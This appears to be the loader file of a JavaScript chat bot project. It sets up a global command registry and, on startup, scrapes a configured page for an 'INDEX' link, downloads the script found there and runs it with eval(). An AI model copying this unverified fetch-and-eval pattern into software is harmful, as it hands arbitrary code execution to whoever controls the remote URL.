
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Aslam Dullah                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const dullaConfig = require("./config");

// Global command registry
global.commands = global.commands || [];
global.cm = global.cm || [];
global.ev = global.ev || {
  events: {},
  on(event, callback) {
    if (!this.events[event]) this.events[event] = [];
    this.events[event].push(callback);
  },
  emit(event, data) {
    if (this.events[event]) this.events[event].forEach(cb => cb(data));
  }
};

// Create global.dullah as a function that matches the expected pattern
function dullaFunction(obj, fonctions) {
  if (typeof obj === 'object' && typeof fonctions === 'function') {
    let infoComs = obj;
    if (!obj.categorie) infoComs.categorie = "General";
    if (!obj.reaction) infoComs.reaction = "🚀";
    infoComs.fonction = fonctions;
    global.cm.push(infoComs);
    global.commands.push({ options: obj, handler: fonctions });
    return infoComs;
  }
  return dullaConfig;
}

// Attach config properties to the function
Object.keys(dullaConfig).forEach(key => {
  if (typeof dullaConfig[key] !== 'function') {
    Object.defineProperty(dullaFunction, key, {
      get: function() { return dullaConfig[key]; },
      enumerable: true
    });
  }
});

dullaFunction.cm = global.cm;
dullaFunction.ev = global.ev;

global.dullah = dullaFunction;
const dullah = global.dullah;

async function fetchINDEXUrl() {
  try {
    const response = await axios.get(dullaConfig.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("INDEX")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    const dullah = global.dullah;
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchINDEXUrl();
